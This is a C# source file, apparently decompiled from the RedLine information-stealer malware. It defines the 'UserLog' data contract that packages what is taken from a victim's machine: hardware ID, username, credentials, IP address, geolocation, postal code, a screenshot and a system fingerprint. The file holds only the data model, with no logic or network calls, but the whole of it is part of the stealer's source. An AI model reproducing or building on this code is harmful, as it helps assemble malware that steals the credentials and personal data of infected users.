using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using RedLine.Client.Models;

namespace RedLine.Models
{
	// Token: 0x02000017 RID: 23
	[DataContract(Name = "UserLog", Namespace = "v1/Models")]
	public struct UserLog
	{
		// Token: 0x17000034 RID: 52
		// (get) Token: 0x06000089 RID: 137 RVA: 0x00003574 File Offset: 0x00001774
		// (set) Token: 0x0600008A RID: 138 RVA: 0x0000357C File Offset: 0x0000177C
		[DataMember(Name = "HWID")]
		public string HWID { get; set; }

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x0600008B RID: 139 RVA: 0x00003585 File Offset: 0x00001785
		// (set) Token: 0x0600008C RID: 140 RVA: 0x0000358D File Offset: 0x0000178D
		[DataMember(Name = "BuildID")]
		public string BuildID { get; set; }

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x0600008D RID: 141 RVA: 0x00003596 File Offset: 0x00001796
		// (set) Token: 0x0600008E RID: 142 RVA: 0x0000359E File Offset: 0x0000179E
		[DataMember(Name = "Username")]
		public string Username { get; set; }

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x0600008F RID: 143 RVA: 0x000035A7 File Offset: 0x000017A7
		// (set) Token: 0x06000090 RID: 144 RVA: 0x000035AF File Offset: 0x000017AF
		[DataMember(Name = "IsProcessElevated")]
		public bool IsProcessElevated { get; set; }

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x06000091 RID: 145 RVA: 0x000035B8 File Offset: 0x000017B8
		// (set) Token: 0x06000092 RID: 146 RVA: 0x000035C0 File Offset: 0x000017C0
		[DataMember(Name = "OS")]
		public string OS { get; set; }

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x06000093 RID: 147 RVA: 0x000035C9 File Offset: 0x000017C9
		// (set) Token: 0x06000094 RID: 148 RVA: 0x000035D1 File Offset: 0x000017D1
		[DataMember(Name = "CurrentLanguage")]
		public string CurrentLanguage { get; set; }

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x06000095 RID: 149 RVA: 0x000035DA File Offset: 0x000017DA
		// (set) Token: 0x06000096 RID: 150 RVA: 0x000035E2 File Offset: 0x000017E2
		[DataMember(Name = "MonitorSize")]
		public string MonitorSize { get; set; }

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x06000097 RID: 151 RVA: 0x000035EB File Offset: 0x000017EB
		// (set) Token: 0x06000098 RID: 152 RVA: 0x000035F3 File Offset: 0x000017F3
		[DataMember(Name = "LogDate")]
		public DateTime LogDate { get; set; }

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x06000099 RID: 153 RVA: 0x000035FC File Offset: 0x000017FC
		// (set) Token: 0x0600009A RID: 154 RVA: 0x00003604 File Offset: 0x00001804
		[DataMember(Name = "Credentials")]
		public Credentials Credentials { get; set; }

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x0600009B RID: 155 RVA: 0x0000360D File Offset: 0x0000180D
		// (set) Token: 0x0600009C RID: 156 RVA: 0x00003615 File Offset: 0x00001815
		[DataMember(Name = "Country")]
		public string Country { get; set; }

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x0600009D RID: 157 RVA: 0x0000361E File Offset: 0x0000181E
		// (set) Token: 0x0600009E RID: 158 RVA: 0x00003626 File Offset: 0x00001826
		[DataMember(Name = "Location")]
		public string Location { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x0600009F RID: 159 RVA: 0x0000362F File Offset: 0x0000182F
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x00003637 File Offset: 0x00001837
		[DataMember(Name = "TimeZone")]
		public string TimeZone { get; set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060000A1 RID: 161 RVA: 0x00003640 File Offset: 0x00001840
		// (set) Token: 0x060000A2 RID: 162 RVA: 0x00003648 File Offset: 0x00001848
		[DataMember(Name = "IP")]
		public string IP { get; set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000A3 RID: 163 RVA: 0x00003651 File Offset: 0x00001851
		// (set) Token: 0x060000A4 RID: 164 RVA: 0x00003659 File Offset: 0x00001859
		[DataMember(Name = "Screenshot")]
		public byte[] Screenshot { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000A5 RID: 165 RVA: 0x00003662 File Offset: 0x00001862
		// (set) Token: 0x060000A6 RID: 166 RVA: 0x0000366A File Offset: 0x0000186A
		[DataMember(Name = "FingerPrint")]
		public FingerPrint FingerPrint { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000A7 RID: 167 RVA: 0x00003673 File Offset: 0x00001873
		// (set) Token: 0x060000A8 RID: 168 RVA: 0x0000367B File Offset: 0x0000187B
		[DataMember(Name = "Exceptions")]
		public List<string> Exceptions { get; set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x00003684 File Offset: 0x00001884
		// (set) Token: 0x060000AA RID: 170 RVA: 0x0000368C File Offset: 0x0000188C
		[DataMember(Name = "PostalCode")]
		public string PostalCode { get; set; }
	}
}
